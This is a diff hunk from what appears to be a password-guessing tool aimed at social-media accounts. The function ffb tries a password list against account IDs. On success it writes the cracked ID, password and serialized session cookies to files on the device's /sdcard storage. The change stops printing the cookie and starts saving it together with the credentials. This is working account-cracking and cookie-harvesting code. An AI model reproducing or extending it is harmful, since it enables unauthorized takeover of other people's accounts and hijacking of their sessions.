@@ -1937,8 +1937,8 @@ def ffb(ids,names,passlist):
                                 print('\r\r\033[1;32m [AJX-OK] %s | %s'%(ids,pas))
                                 dc=dict(session.cookies)
                                 coki=";".join([k+"="+v for k,v in dc.items()])
-                                print("Cookie: "+coki)
-                                open('/sdcard/AJX-COOKIE.txt','a').write(coki+'\n')
+                               # print(#"Cookie: "+coki#)
+                                open('/sdcard/AJX-OK-COOKIES.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                                 open('/sdcard/AJX-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                 oks.append(ids)
                                 break
